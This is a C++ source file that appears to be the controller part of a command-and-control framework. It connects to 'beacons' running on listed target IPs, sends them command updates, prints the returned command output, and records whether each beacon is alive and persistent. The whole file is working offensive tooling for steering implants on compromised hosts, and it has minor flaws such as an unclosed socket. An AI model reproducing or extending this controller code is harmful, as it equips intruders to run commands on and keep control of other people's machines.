#include <iostream>
#include <string>
#include <tuple>
#include <sstream>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <unistd.h>
#include <cmds.hpp>
#include <nlohmann/json.hpp>
#include <net.hpp>

#define SUCCESS 100

using json = nlohmann::json;

std::tuple<std::string, int> get_beacon_data(sockaddr_in &sa, int &tid){
    json config = getConfig();
    std::string ip_addr = config["targets"][tid]["ip"];
    return {ip_addr, config["targets"][tid]["beacon"]["port"]};
}

void process(std::string reply, std::string ip, int port){
    json b_response;
    int id;
    int status;
    bool alive;
    bool persistent;
    try {
        b_response = json::parse(reply);
    }
    catch (...) {
        std::cerr << "failed to parse json from beacon on " << ip << std::endl;
        return;
    }
    try {
        id = b_response["id"];
        status = b_response["status"];
        alive = b_response["alive"];
        persistent = b_response["persistent"];
    }
    catch (...){
        std::cerr << "unable to assign response to variables\n";
        return;
    }
    std::string cout = b_response["cout"];
    if (status != SUCCESS) {
        std::cerr << "error executing command on beacon at [" << ip << "]\n";
    }
    std::cout << "[b-" << id << "]" << std::endl;
    std::cout << cout << std::endl;
    json config = getConfig();
    config["targets"][id]["beacon"]["alive"] = alive;
    config["targets"][id]["beacon"]["persistent"] = persistent;
    setConfig(config);
}

void communicate(int tid, std::string update) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0), valread, s_client_fd;

    if (sockfd < 0){
        std::cerr << "Error opening socket.\n";
        return;
    }
    sockaddr_in beacon_addr;
    beacon_addr.sin_family = AF_INET;
    auto [ip, port] = get_beacon_data(beacon_addr, tid);
    beacon_addr.sin_addr.s_addr = inet_addr(ip.c_str());
    beacon_addr.sin_port = htons(port);
    if ((s_client_fd = connect(sockfd, (struct sockaddr*)&beacon_addr, sizeof(beacon_addr))) < 0){
        std::cout << "Failed to connect to beacon on target " << tid << " [" << ip << "]\n";
        return;
    }
    send(sockfd, update.c_str(), strlen(update.c_str()), MSG_NOSIGNAL);
    char buf[1024]{0};
    valread = read(sockfd, buf, 1024);
    std::string reply = std::string{buf}.substr(0,valread);
    process(reply, ip, port);
}